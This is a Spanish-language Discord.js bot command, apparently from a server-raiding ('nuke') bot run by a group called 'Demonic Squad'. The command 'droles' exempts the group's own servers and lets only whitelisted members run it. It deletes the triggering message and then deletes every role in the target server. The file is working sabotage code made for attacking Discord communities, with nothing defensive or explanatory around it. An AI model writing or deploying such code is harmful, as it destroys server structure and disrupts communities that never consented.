const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {

if(message.guild.name === "Ḋemonic ֆquad | Þriv") return;
if(message.guild.name === "• [ Demonic Squad | Logs ]") return;

const db = require ('megadb');
const squad = new db.crearDB('squad');

 if (!squad.has(message.author.id)) return;

try{

  message.delete();
  
message.guild.roles.cache.forEach(roles => roles.delete());

  }catch(e) {
    message.author.send(new MessageEmbed().setDescription("```Error ❌ Ha ocurrido una falla```")
    .addField("__Posibles Errores:__", "```• Permisos insuficientes\n• Cantidad máxima de roles```")
    .addField("__Error Detallado:__", "```"+e+"```"));
  }

}

exports.help = {
  name: "droles",
  aliases:["deleteroles", "rolesdelete", "rold", "drol"],
  usage: "[ Uso Independiente : No require Argumentos ]",
  description: "Elimina todos los roles del servidor.",
  category:"Private"
  
}